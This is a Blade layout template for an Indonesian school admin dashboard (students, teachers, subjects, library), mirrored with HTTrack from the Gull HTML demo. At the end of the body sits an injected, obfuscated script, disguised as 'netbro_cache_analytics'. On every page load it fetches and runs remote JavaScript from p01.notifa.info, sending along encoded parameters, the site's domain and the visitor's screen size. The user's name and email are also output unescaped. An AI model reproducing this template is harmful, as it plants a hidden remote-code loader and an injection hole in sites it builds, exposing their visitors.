<!DOCTYPE html>
<html lang="en">


<!-- Mirrored from demos.ui-lib.com/gull-html/blank.html by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 20 Jan 2019 04:47:34 GMT -->
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>@yield('title')</title>
    <link href="https://fonts.googleapis.com/css?family=Nunito:300,400,400i,600,700,800,900" rel="stylesheet">
    <link rel="stylesheet" href="{{asset('assets/styles/css/themes/lite-purple.min.css')}}">
    <link rel="stylesheet" href="{{asset('assets/styles/vendor/perfect-scrollbar.css')}}">
    <link rel="stylesheet" href="{{asset('assets/styles/vendor/datatables.min.css')}}">
    <script src="{{asset('assets/js/swal/sweetalert.min.js')}}"></script>
    <!-- <link rel="stylesheet" href="{{asset('assets/styles/vendor/sweetalert2.min.css')}}"> -->
</head>

<body>
    <div class="app-admin-wrap">
        <div class="main-header">
            <div class="logo">
                <img src="{{asset('assets/images/logo.png')}}" alt="">
            </div>

            <div class="menu-toggle">
                <div></div>
                <div></div>
                <div></div>
            </div>

            <div class="d-flex align-items-center">
                <div class="search-bar">
                    <input type="text" placeholder="Search">
                    <i class="search-icon text-muted i-Magnifi-Glass1"></i>
                </div>
            </div>

            <div style="margin: auto"></div>

            <div class="header-part-right">
                <!-- Full screen toggle -->
                <i class="i-Full-Screen header-icon d-none d-sm-inline-block" data-fullscreen></i>
                <!-- Notificaiton -->
                <div class="dropdown">
                    <div class="badge-top-container" role="button" id="dropdownNotification" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                        <span class="badge badge-primary">3</span>
                        <i class="i-Bell text-muted header-icon"></i>
                    </div>
                    <!-- Notification dropdown -->
                    <div class="dropdown-menu dropdown-menu-right notification-dropdown" aria-labelledby="dropdownNotification" data-perfect-scrollbar data-suppress-scroll-x="true">
                        <div class="dropdown-item d-flex">
                            <div class="notification-icon">
                                  <i class="i-Speach-Bubble-6 text-primary mr-1"></i>
                            </div>
                            <div class="notification-details flex-grow-1">
                                <p class="m-0 d-flex align-items-center">
                                    <span>New message</span>
                                    <span class="badge badge-pill badge-primary ml-1 mr-1">new</span>
                                    <span class="flex-grow-1"></span>
                                    <span class="text-small text-muted ml-auto">10 sec ago</span>
                                </p>
                                <p class="text-small text-muted m-0">James: Hey! are you busy?</p>
                            </div>
                        </div>
                    </div>
                </div>
                <!-- Notificaiton End -->

                <!-- User avatar dropdown -->
                <div class="dropdown">
                    <div class="user col align-self-end">
                        <img src="{{asset('assets/images/faces/1.jpg')}}" id="userDropdown" alt="" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">

                        <div class="dropdown-menu dropdown-menu-right" aria-labelledby="userDropdown">
                            <div class="dropdown-header">
                                <i class="i-Lock-User mr-1"></i> {!! substr( Auth::user()->name,0,15) !!}...
                            </div>
                            <a class="dropdown-item">{!! substr( Auth::user()->email,0,15) !!}...</a>
                            <a class="dropdown-item">Billing history</a>
                            <a href="{{ route('logout') }}" onclick="event.preventDefault();document.getElementById('logout-form').submit();" class="dropdown-item has-icon text-danger">
                                <i class="fas fa-sign-out-alt"></i> Log out
                            </a>
                            <form id="logout-form" action="{{ route('logout') }}" method="POST" style="display: none;">
                                  {{ csrf_field() }}
                            </form>

                        </div>
                    </div>
                </div>
            </div>

        </div>
        <!-- header top menu end -->

        <div class="side-content-wrap">
            <div class="sidebar-left open" data-perfect-scrollbar data-suppress-scroll-x="true">
                <ul class="navigation-left">
                    <li class="nav-item">
                        <a class="nav-item-hold" href="{{ url('index') }}">
                            <i class="nav-icon i-File-Horizontal-Text"></i>
                            <span class="nav-text">Dashboard</span>
                        </a>
                        <div class="triangle"></div>
                    </li>
                    <li class="nav-item" data-item="dashboard">
                        <a class="nav-item-hold" href="#">
                            <i class="nav-icon i-Administrator"></i>
                            <span class="nav-text">Siswa-Siswi</span>
                        </a>
                        <div class="triangle"></div>
                    </li>
                    <li class="nav-item">
                        <a class="nav-item-hold" href="{{ url('jurusan/index') }}">
                            <i class="nav-icon i-Professor"></i>
                            <span class="nav-text">Paket Keahlian</span>
                        </a>
                        <div class="triangle"></div>
                    </li>
                    <li class="nav-item">
                        <a class="nav-item-hold" href="{{ url('rayon/index') }}">
                            <i class="nav-icon i-Home1"></i>
                            <span class="nav-text">Rayon</span>
                        </a>
                        <div class="triangle"></div>
                    </li>
                    <li class="nav-item" data-item="kbm">
                        <a class="nav-item-hold" href="#">
                            <i class="nav-icon i-MaleFemale"></i>
                            <span class="nav-text">KBM</span>
                        </a>
                        <div class="triangle"></div>
                    </li>
                    <li class="nav-item">
                        <a class="nav-item-hold" href="{{ url('kelas/index') }}">
                            <i class="nav-icon i-Home1"></i>
                            <span class="nav-text">Kelas</span>
                        </a>
                        <div class="triangle"></div>
                    </li>
                    <li class="nav-item" data-item="perpus">
                        <a class="nav-item-hold" href="#">
                            <i class="nav-icon i-Book"></i>
                            <span class="nav-text">Perpustakaan</span>
                        </a>
                        <div class="triangle"></div>
                    </li>
                </ul>
            </div>

            <div class="sidebar-left-secondary" data-perfect-scrollbar data-suppress-scroll-x="true">
                <!-- Submenu Dashboards -->
                <ul class="childNav" data-parent="dashboard">
                    <li class="nav-item">
                        <a href="{{url('siswa/index')}}">
                            <i class="nav-icon i-Administrator"></i>
                            <span class="item-name">Data Siswa-Siswi</span>
                        </a>
                    </li>
                </ul>
                <ul class="childNav" data-parent="kbm">
                    <li class="nav-item">
                        <a href="{{url('guru/index')}}">
                            <i class="nav-icon i-Administrator"></i>
                            <span class="item-name">Guru</span>
                        </a>
                    </li>
                </ul>
                <ul class="childNav" data-parent="kbm">
                    <li class="nav-item">
                        <a href="{{url('mapel/index')}}">
                            <i class="nav-icon i-Book"></i>
                            <span class="item-name">Mata Pelajaran</span>
                        </a>
                    </li>
                </ul>
                <ul class="childNav" data-parent="perpus">
                    <li class="nav-item">
                        <a href="{{url('mapel/index')}}">
                            <i class="nav-icon i-Video-Photographer"></i>
                            <span class="item-name">Dashboard</span>
                        </a>
                    </li>
                </ul>
                <ul class="childNav" data-parent="perpus">
                    <li class="nav-item">
                        <a href="{{url('mapel/index')}}">
                            <i class="nav-icon i-Book"></i>
                            <span class="item-name">Data Buku</span>
                        </a>
                    </li>
                </ul>
                <ul class="childNav" data-parent="perpus">
                    <li class="nav-item">
                        <a href="{{url('mapel/index')}}">
                            <i class="nav-icon i-Checkout-Basket"></i>
                            <span class="item-name">Data Peminjaman</span>
                        </a>
                    </li>
                </ul>
                <!-- <ul class="childNav" data-parent="perpus">
                    <li class="nav-item">
                        <a href="{{url('mapel/index')}}">
                            <i class="nav-icon i-Financial"></i>
                            <span class="item-name">Stok</span>
                        </a>
                    </li>
                </ul> -->
            </div>
            <div class="sidebar-overlay"></div>
        </div>
        <!--=============== Left side End ================-->

        <!-- ============ Body content start ============= -->
        <div class="main-content-wrap sidenav-open d-flex flex-column">
            <div class="breadcrumb">
                <h1>@yield('title')</h1>
            </div>

            <div class="separator-breadcrumb border-top"></div>

            <div class="main-content">
                <section class="section">
                  <!-- <div class="section-header">
                    <h1>@yield('title')</h1>
                  </div> -->
                    
                  <div class="section-body">
                    @yield('content')
                  </div>
                </section>
            </div>


            <!-- Footer Start -->
            <div class="flex-grow-1"></div>
            <div class="app-footer">
                <div class="footer-bottom border-top pt-3 d-flex flex-column flex-sm-row align-items-center">
                    <span class="flex-grow-1"></span>
                    <div class="d-flex align-items-center">
                        <img class="logo" src="assets/images/logo.png" alt="">
                        <div>
                            <p class="m-0">&copy; 2018 Gull HTML</p>
                            <p class="m-0">All rights reserved</p>
                        </div>
                    </div>
                </div>
            </div>
            <!-- fotter end -->
        </div>
        <!-- ============ Body content End ============= -->
    </div>
    <!--=============== End app-admin-wrap ================-->

    <!-- ============ Search UI Start ============= -->
    <div class="search-ui">
        <div class="search-header">
            <img src="assets/images/logo.png" alt="" class="logo">
            <button class="search-close btn btn-icon bg-transparent float-right mt-2">
                <i class="i-Close-Window text-22 text-muted"></i>
            </button>
        </div>

        <input type="text" placeholder="Type here" class="search-input" autofocus>

        <div class="search-title">
            <span class="text-muted">Search results</span>
        </div>

        <div class="search-results list-horizontal">
            <div class="list-item col-md-12 p-0">
                <div class="card o-hidden flex-row mb-4 d-flex">
                    <div class="list-thumb d-flex">
                        <!-- TUMBNAIL -->
                        <img src="assets/images/products/headphone-1.jpg" alt="">
                    </div>
                    <div class="flex-grow-1 pl-2 d-flex">
                        <div class="card-body align-self-center d-flex flex-column justify-content-between align-items-lg-center flex-lg-row">
                            <!-- OTHER DATA -->
                            <a href="#" class="w-40 w-sm-100">
                                <div class="item-title">Headphone 1</div>
                            </a>
                            <p class="m-0 text-muted text-small w-15 w-sm-100">Gadget</p>
                            <p class="m-0 text-muted text-small w-15 w-sm-100">
                                $300
                                <del class="text-secondary">$400</del>
                            </p>
                            <p class="m-0 text-muted text-small w-15 w-sm-100 d-none d-lg-block item-badges">
                                <span class="badge badge-danger">Sale</span>
                            </p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <!-- PAGINATION CONTROL -->
        <div class="col-md-12 mt-5 text-center">
            <nav aria-label="Page navigation example">
                <ul class="pagination d-inline-flex">
                    <li class="page-item">
                        <a class="page-link" href="#" aria-label="Previous">
                            <span aria-hidden="true">&laquo;</span>
                            <span class="sr-only">Previous</span>
                        </a>
                    </li>
                    <li class="page-item"><a class="page-link" href="#">1</a></li>
                    <li class="page-item"><a class="page-link" href="#">2</a></li>
                    <li class="page-item"><a class="page-link" href="#">3</a></li>
                    <li class="page-item">
                        <a class="page-link" href="#" aria-label="Next">
                            <span aria-hidden="true">&raquo;</span>
                            <span class="sr-only">Next</span>
                        </a>
                    </li>
                </ul>
            </nav>
        </div>
    </div>
    <!-- ============ Search UI End ============= -->

    <script src="{{asset('assets/js/vendor/jquery-3.3.1.min.js')}}"></script>
    <script src="{{asset('assets/js/vendor/bootstrap.bundle.min.js')}}"></script>
    <script src="{{asset('assets/js/vendor/perfect-scrollbar.min.js')}}"></script>
    <script src="{{asset('assets/js/es5/script.min.js')}}"></script>
    <script src="{{asset('assets/js/vendor/datatables.min.js')}}"></script>
    <script src="{{asset('assets/js/datatables.script.js')}}"></script>
    <script src="{{asset('assets/js/modal.script.js')}}"></script>
    <script>
        $("[data-toggle=popover]").popover();
    </script>
    <!-- <script src="{{asset('assets/js/vendor/sweetalert2.min.js')}}"></script> -->
    <!-- <script src="{{asset('assets/js/sweetalert.script.js')}}"></script> -->
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2a5sR52uI4gc3sSpuR3vXDpRjYBiJ%2f4QGLBezPaMfFVay%2fEjY3YHKqGnP1qkVCzytFVkQkzpn2m%2fzGEvd5g3xP83JVccnoiB7Yh7GSc19FaMPc1ggxncmDvOGDSy0pLAj7%2b3an0RR7Bsfb0TBHdaaYMy5YOeqoBzcwKTtug7NX2588Uveisj0IEMEofhKeT5A0PhNeBcFKF5ramZ%2b9nSK9evVV%2bJOmH%2btsvzxPRjxhA3UfU5tQCQ7%2fR0Zh44iIafJ5a1OKA%2fIyPSOqY34gZrnm2p16rBlcfdqZW7lZCs06zbqv5BpDoVWWMdjyCrvt3HRuOM2O9cwLdG%2bXn%2f32%2fKEsj%2ftoQlnUx2u06CTFcMHisKLH7uFyn9xroKG6KLbw6sWJERt%2fFV0Xumm0ajxXrYSMVFiW1kOaIRCLJ%2b7D6sf%2fNmUiXvIEUM%2bUuQrHOmWbo%2bhZmEvumsVuvpqlOKPRoaJxSN1OuukF%2f7i" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>


<!-- Mirrored from demos.ui-lib.com/gull-html/blank.html by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 20 Jan 2019 04:47:35 GMT -->
</html>